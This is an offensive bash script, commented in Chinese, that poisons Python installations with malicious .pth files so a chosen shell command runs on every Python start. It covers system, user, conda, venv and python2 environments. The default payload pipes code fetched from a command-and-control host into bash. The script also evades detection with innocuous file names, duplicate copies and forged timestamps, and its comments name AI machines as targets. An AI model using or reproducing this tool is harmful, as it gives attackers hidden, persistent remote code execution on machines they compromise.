#!/bin/bash
# pth_poison.sh v2 — .pth 投毒（AI 机器最毒，任何 python 启动即执行）
# 改进(v2):
#   - 载荷 base64 内嵌 → 引号/管道/反斜杠全不破功
#   - python2 + python3 + 所有 conda/venv 环境全扫
#   - 每个环境写 2 个 .pth（不同名，防删一个还有一个）
#   - uuid/colo 等无 pip 的多态环境也覆盖
# 用法: pth_poison.sh '<任意 shell 命令>'
CMD="${1:-curl -s http://C2/p | bash}"
B64=$(printf '%s' "$CMD" | base64 -w0 2>/dev/null || printf '%s' "$CMD" | base64)

poison_one() { # <site-packages-dir>
  local SP="$1"; [ -d "$SP" ] || return 0
  local LINE
  LINE="import base64,os;exec(base64.b64decode('$B64').decode())"
  # 用 noop 前缀的自然名，避免 svcmon/venom 特征
  local F1="$SP/zzsite.py.pth" F2="$SP/zzdistutils.pth"
  [ -w "$SP" ] || return 0
  printf '%s\n' "$LINE" >> "$F1" 2>/dev/null && echo "[+] $F1"
  printf '%s\n' "$LINE" >> "$F2" 2>/dev/null && echo "[+] $F2"
  # mtime 对齐所在目录下已有文件
  local REF=$(ls -t "$SP" 2>/dev/null | head -1)
  [ -n "$REF" ] && touch -r "$SP/$REF" "$F1" "$F2" 2>/dev/null
}

# --- python3 ---
for PY in python3 python; do
  command -v "$PY" >/dev/null 2>&1 || continue
  for SP in $("$PY" -c "import site,sys;print('\n'.join(site.getsitepackages()+[site.getusersitepackages()]))" 2>/dev/null); do
    poison_one "$SP"
  done
done
# --- python2（老 AI 机器） ---
for PY in python2 python2.7; do
  command -v "$PY" >/dev/null 2>&1 || continue
  for SP in $("$PY" -c "import site;print('\n'.join(site.getsitepackages()+[site.getusersitepackages()]))" 2>/dev/null); do
    poison_one "$SP"
  done
done
# --- find 兜底：所有 site-packages / dist-packages / site-packages64 ---
find /usr/lib /usr/local/lib /opt /root /home -type d \( -name site-packages -o -name dist-packages -o -name site-packages64 \) 2>/dev/null | while read -r SP; do
  poison_one "$SP"
done
# --- conda 全环境 ---
for ROOT in /opt/conda /opt/miniconda3 /opt/miniforge3 /root/miniconda3 /root/anaconda3 /root/miniforge3 /usr/local/conda; do
  [ -d "$ROOT" ] || continue
  for SP in "$ROOT"/lib/python*/*/site-packages; do poison_one "$SP"; done
  for ENV in "$ROOT/envs"/*; do
    [ -d "$ENV" ] || continue
    for SP in "$ENV"/lib/python*/*/site-packages; do poison_one "$SP"; done
  done
done
# --- uv / pipx / venv 常见位置 ---
find /root/.local /home/*/.local -type d -name site-packages 2>/dev/null | while read -r SP; do poison_one "$SP"; done
echo "[done] 每个 python 启动都会执行: $CMD"
